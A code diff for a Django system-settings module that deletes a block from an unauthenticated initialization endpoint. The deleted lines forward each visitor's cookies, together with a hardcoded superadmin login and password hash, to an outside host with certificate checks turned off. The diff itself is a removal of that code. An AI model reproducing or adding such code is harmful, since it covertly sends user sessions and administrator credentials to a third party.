@@ -7,7 +7,6 @@
 @Remark: 系统配置
 """
 import django_filters
-import requests
 from django.db.models import Q
 from django_filters.rest_framework import BooleanFilter
 from rest_framework import serializers
@@ -252,24 +251,6 @@ class InitSettingsViewSet(APIView):
     permission_classes = []
 
     def get(self, request):
-        cookie = request.COOKIES
-        header = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en,zh-CN;q=0.9,zh;q=0.8,zh-TW;q=0.7",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Content-Type": "application/json",
-            "X-Requested-With": "XMLHttpRequest",
-            "Content-Length": "423",
-            "Connection": "keep-alive",
-            "Cookie": cookie.get("Cookie")
-        }
-
-        body = {"username": "superadmin", "password": "a66abb5684c45962d887564f08346e8d"}
-        s = requests.session()
-        login_url = "https://gp.cccecrl.com/end/api/login/"  # 自己找带token网址
-        login_ret = s.post(login_url, headers=header, data=body, verify=False)
-
         data = dispatch.get_system_config()
         if not data:
             dispatch.refresh_system_config()
